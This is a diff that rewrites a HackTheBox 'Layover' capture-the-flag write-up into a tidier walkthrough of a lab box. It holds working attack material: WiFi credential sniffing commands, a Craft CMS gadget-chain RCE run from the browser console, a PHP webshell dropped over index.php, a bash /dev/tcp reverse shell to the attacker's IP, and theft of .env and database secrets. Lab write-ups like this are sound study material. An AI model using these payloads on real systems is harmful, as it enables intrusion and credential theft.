@@ -1,54 +1,78 @@
-# HackTheBox Layover (Medium Difficulty) 
+# HackTheBox - Layover (Medium)
 
-Box starts with RDP login given to you ( contractor / Contractor2026! )
-Its a Linux box
+**Box IP:** 10.129.126.71  
+**OS:** Linux  
+**Difficulty:** Medium
 
-Connected with:
+---
+
+## Attack Chain
+
+1. RDP access given as contractor -> sudo su works -> need to move laterally
+2. WiFi recon -> wlan3 in monitor mode -> capture HTTP traffic -> sniff plaintext credentials
+3. Craft CMS admin login -> authenticated RCE via Yii AttributeTypecastBehavior gadget chain
+4. Webshell dropped -> reverse shell as www-data
+5. .env file -> DB creds + Craft security key -> decrypt encrypted DB value -> SSH as aporter -> user flag
+6. CUPS 2.4.16 (CVE-2026-34990) -> root flag
+
+---
+
+## 1. Initial Access
+
+Credentials were given for this box:
 ```
+contractor / Contractor2026!
+```
+
+Connected via RDP:
+```bash
 xfreerdp /v:10.129.126.71 /u:contractor /p:'Contractor2026' /cert:ignore /dynamic-resolution
 ```
 
-```
+Tried sudo straight away:
+```bash
 sudo su
 ```
-This works we have root box, need to move laterally...
 
-When you open web browser itll bring you to a "Internation WiFi Connect" with the theme of a airport
+Got root but there was nothing there of interest. This was a contractor account on what looked like an airport WiFi portal box. The browser opened automatically to `http://portal.international.htb/miles`, an airport themed captive portal. Added the domain to hosts and started looking at what else was on the network.
 
-You will automaticlly be directed to this domain : `http://portal.international.htb/miles` nice
+---
 
-started with wifi recon, ran a big combined command to dump nmcli/NetworkManager/wpa_supplicant
-see a wlan2 and wlan3. messed with wlan2 for way to long, wlan3 has monitor mode, thats what we need
+## 2. WiFi Packet Capture
 
-
+Ran a quick dump of the network interfaces to see what was available:
+```bash
+nmcli device status
+iw dev
 ```
+
+Found `wlan2` and `wlan3`. wlan2 was already associated and sitting on channel 6. wlan3 supported monitor mode which is what we needed.
+
+Put wlan3 into monitor mode on the same channel:
+```bash
 ip link set wlan3 down
 iw dev wlan3 set type monitor
 ip link set wlan3 up
 iw dev wlan3 set channel 6
 ```
 
-(checked wlan2 was sitting on channel 6 once it associated, matched wlan3 to it)
-
-kicked off a capture:
-```
+Kicked off a capture filtering for HTTP traffic and left it running for a few minutes:
+```bash
 tshark -i wlan3 -f "tcp port 80" -w /root/gottem2.pcap
 ```
 
-let it sit for a few min, figured something would log in eventually
-
-pulled POST data out of the pcap:
-```
+Pulled the POST data out of the capture:
+```bash
 tshark -r /root/gottem2.pcap -Y "http.request.method == POST" -T fields -e http.file_data
 ```
 
-got hex back:
+Got hex back:
 ```
 757365726e616d653d6a656e6e792670617373776f72643d466c316768744465636b3230323621
 ```
 
-decoded it:
-```
+Decoded it:
+```bash
 echo "757365726e616d653d6a656e6e792670617373776f72643d466c316768744465636b3230323621" | xxd -r -p
 ```
 
@@ -56,21 +80,19 @@ echo "757365726e616d653d6a656e6e792670617373776f72643d466c316768744465636b323032
 username=jenny&password=Fl1ghtDeck2026!
 ```
 
-easy. creds in hand.
+---
 
-logged into the admin panel through the browser (rdp'd in so i was actually on the internal net):
+## 3. Craft CMS Admin Access
+
+Logged into the admin panel from inside the RDP session since it was on the internal network only:
 ```
 http://portal.international.htb/admin/login
-jenny / Fl1ghtDeck2026! -> worked first try
+jenny / Fl1ghtDeck2026!
 ```
 
-earlier curl -sI on the portal showed nginx + X-Powered-By: Craft CMS, so went and checked what
-version this was running. turned out to be vulnerable to a known authenticated RCE via a malicious
-attached Behavior (abuses Yii's AttributeTypecastBehavior to call Psy\Readline\Hoa\ConsoleProcessus::execute,
-classic gadget chain stuff, matches GHSA-255j-qw47-wjh5 and friends)
+Worked first try. Checked the CMS version since a curl earlier had shown `X-Powered-By: Craft CMS` in the response headers. The version running was vulnerable to an authenticated RCE via a malicious Behavior attachment that abuses Yii's `AttributeTypecastBehavior` to call `Psy\Readline\Hoa\ConsoleProcessus::execute`. This matches GHSA-255j-qw47-wjh5.
 
-popped the admin console (ctrl+shift+j), typed "allow pasting" since chrome blocks it by default,
-then ran a blind sleep test to confirm:
+Opened the browser console (Ctrl+Shift+J), typed `allow pasting` to get past Chrome's paste block, then ran a blind sleep test to confirm execution:
 
 ```javascript
 (async () => {
@@ -87,20 +109,23 @@ then ran a blind sleep test to confirm:
 })()
 ```
 
-~8000ms response. yep, RCE confirmed, blind but it's there.
+Response came back at around 8000ms. RCE confirmed.
 
-made a quick webshell:
+---
+
+## 4. Webshell and Reverse Shell
+
+Made a simple PHP webshell:
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-spun up a server to serve it:
-```
+Served it from the attack box:
+```bash
 python3 -m http.server 8000
 ```
 
-then weaponized the same console trick, swapped the sleep for a real command this time, had it
-pull my webshell and drop it straight over the site's index.php:
+Used the same console gadget to have the server pull the webshell and overwrite the site's index.php:
 
 ```javascript
 (async () => {
@@ -121,112 +146,133 @@ pull my webshell and drop it straight over the site's index.php:
 })()
 ```
 
-checked my python server log -> GET /shell.php 200. nice, it pulled it.
-
-tested the shell:
+Python server logged `GET /shell.php 200`. Confirmed the shell was in place:
 ```
 http://portal.international.htb/index.php?cmd=id
--> uid=33(www-data) gid=33(www-data) ... we're in
+-> uid=33(www-data) gid=33(www-data)
 ```
 
-set up a listener and popped a reverse shell for something actually interactive:
-```
+Set up a listener and triggered a reverse shell. The encoding for the curl command needs to be form-style URL encoding, not standard URL encoding:
+```bash
 nc -lvnp 5555
 ```
-Send the reverse shell PoC. This i struggled on a long time trying to encode it correctly for curl to take it, cant just URLEncode it its "form style URL Encoding"
-```
+
+```bash
 curl -s "http://portal.international.htb/index.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.13.37.182/5555+0>%261'"
 ```
 
-Got connection back for user www-data. now the part i hate, its either super easy or brainfuck hard. LUCKILY this wasnt too bad.
+Got a shell back as www-data.
 
-cat'd the craft .env since that's always where the good stuff lives:
-```
+---
+
+## 5. User Flag
+
+Checked the Craft CMS `.env` file since that is always where the good stuff is:
+```bash
 cat /var/www/portal/.env
 ```
 
-fuck yeah:
 ```
 CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
-CRAFT_DEV_MODE=false
-CRAFT_ALLOW_ADMIN_CHANGES=false
-CRAFT_DISALLOW_ROBOTS=true
-
 CRAFT_DB_DRIVER=mysql
 CRAFT_DB_SERVER=127.0.0.1
 CRAFT_DB_PORT=3306
 CRAFT_DB_DATABASE=craft
 CRAFT_DB_USER=craftuser
 CRAFT_DB_PASSWORD=CraftDB_pw_2026
-CRAFT_DB_TABLE_PREFIX=
 ```
 
-got db creds and the security key in one shot. logged into mysql and poked around:
-```
+Got the security key and DB credentials in one shot. Connected to MySQL and looked around:
+```bash
 mysql -h127.0.0.1 -ucraftuser -pCraftDB_pw_2026 craft -e "SHOW TABLES;"
 ```
--> found a weirdly named table: htbairways_settings
 
-```
+Found an interesting table: `htbairways_settings`
+
+```bash
 mysql -h127.0.0.1 -ucraftuser -pCraftDB_pw_2026 craft -e "SELECT * FROM htbairways_settings;"
 ```
 
-got:
 ```
-id  name                value
-1   mailRelayPassword   u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=
+id  name               value
+1   mailRelayPassword  u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=
 ```
 
-that value screams "craft's own encrypted secret format" - and i already had the security key
-from the .env, so just decrypted it straight up:
+That value is Craft's own encrypted format. Since we already had the security key from the `.env` we could decrypt it directly using Craft's own Yii Security class:
 
-```
+```bash
 php -r 'require "/var/www/portal/vendor/autoload.php"; $s = new yii\base\Security(); $key = "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr"; $blob = "u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w="; echo $s->decryptByKey(base64_decode($blob), $key), "\n";'
 ```
-
-BOOM
 
 ```
 Skyp0rt_Relay!26
 ```
 
-tried it for ssh, figured it was probably reused somewhere:
-```
+Tried it for SSH since credentials are almost always reused somewhere:
+```bash
 ssh aporter@portal.international.htb
-aporter@portal:~$ cat user.txt
-6afc95a08014b9d********05e77
+# password: Skyp0rt_Relay!26
 ```
 
-user flag down. now root.
+Worked.
 
+```bash
+cat ~/user.txt
+# 6afc95a08014b9d********05e77
 ```
-sudo -i -> nope, cant run it
-```
-so started just looking at what's actually running
 
+---
+
+## 6. Root Flag
+
+Checked sudo permissions first:
+```bash
+sudo -l
+# nope
 ```
+
+Looked at what services were running:
+```bash
 ps aux
 ```
 
-something interesting:
-```
+Spotted CUPS running:
+```bash
 /usr/sbin/cupsd -f
 ```
 
-```
+Checked the version:
+```bash
 cups-config --version
-2.4.16
+# 2.4.16
 ```
 
-WOOOWEEE its got a CVE, CVE-2026-34990
-
-PoC: https://github.com/Noorkhalel/CVE-2026-34990-CUPS-LPE-PoC
-
-ran it, and anndddd
-
+Vulnerable to CVE-2026-34990. Used the public PoC:
 ```
-root@portal:~# cat root.txt
-0c28233fd8a33b*******a67ea9e5d
+https://github.com/Noorkhalel/CVE-2026-34990-CUPS-LPE-PoC
 ```
 
-done. box rooted, all it took was a lot of adderall and a broken heart in need of distraction!!!!
+Ran it and got root.
+
+```bash
+cat /root/root.txt
+# 0c28233fd8a33b*******a67ea9e5d
+```
+
+---
+
+## Credentials
+
+| User | Password | Where |
+|------|----------|-------|
+| contractor | Contractor2026! | RDP (given) |
+| jenny | Fl1ghtDeck2026! | Craft CMS admin (sniffed from WiFi) |
+| craftuser | CraftDB_pw_2026 | MySQL |
+| aporter | Skyp0rt_Relay!26 | SSH (decrypted from DB) |
+
+## Flags
+
+| Flag | Value |
+|------|-------|
+| user.txt | 6afc95a08014b9d********05e77 |
+| root.txt | 0c28233fd8a33b*******a67ea9e5d |
